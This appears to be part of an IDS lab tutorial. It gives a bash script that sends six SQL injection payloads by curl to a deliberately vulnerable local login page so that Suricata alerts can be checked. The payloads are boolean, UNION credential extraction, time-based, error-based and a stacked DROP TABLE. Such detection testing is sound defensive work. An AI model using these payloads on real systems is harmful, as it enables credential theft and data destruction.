## Batch Testing Script

### File: `test_all_payloads.sh`

```bash
#!/bin/bash

TARGET="http://testlab.local/test-lab/login_vulnerable.php"
SLEEP_TIME=2

echo "🚀 Starting SQL Injection Payload Tests..."
echo "⏱️  Waiting for alerts... (monitor /var/log/suricata/eve.json in another terminal)"
echo ""

# Boolean SQLi
echo "[1] Testing Boolean SQLi - OR 1=1"
curl -s -X POST $TARGET -d "username=admin' OR 1=1 --&password=test" > /dev/null
sleep $SLEEP_TIME

echo "[2] Testing Boolean SQLi - AND 1=1"
curl -s -X POST $TARGET -d "username=admin' AND 1=1 --&password=test" > /dev/null
sleep $SLEEP_TIME

# UNION
echo "[3] Testing UNION SELECT"
curl -s -X POST $TARGET -d "username=admin' UNION SELECT username, password FROM users --&password=test" > /dev/null
sleep $SLEEP_TIME

# Time-based
echo "[4] Testing SLEEP() - this will be slow..."
timeout 10 curl -s -X POST $TARGET -d "username=admin' AND SLEEP(5) --&password=test" > /dev/null
sleep $SLEEP_TIME

# Error-based
echo "[5] Testing EXTRACTVALUE()"
curl -s -X POST $TARGET -d "username=admin' AND EXTRACTVALUE(0x0a, CONCAT(0x5e, (SELECT user()))) --&password=test" > /dev/null
sleep $SLEEP_TIME

# Stacked queries
echo "[6] Testing DROP TABLE"
curl -s -X POST $TARGET -d "username=admin'; DROP TABLE users --&password=test" > /dev/null
sleep $SLEEP_TIME

echo ""
echo "✅ All payloads sent!"
echo "🔍 Check Suricata alerts for detections (SID 1000200-1000232)"
```

Save and run:
```bash
chmod +x test_all_payloads.sh
./test_all_payloads.sh
```

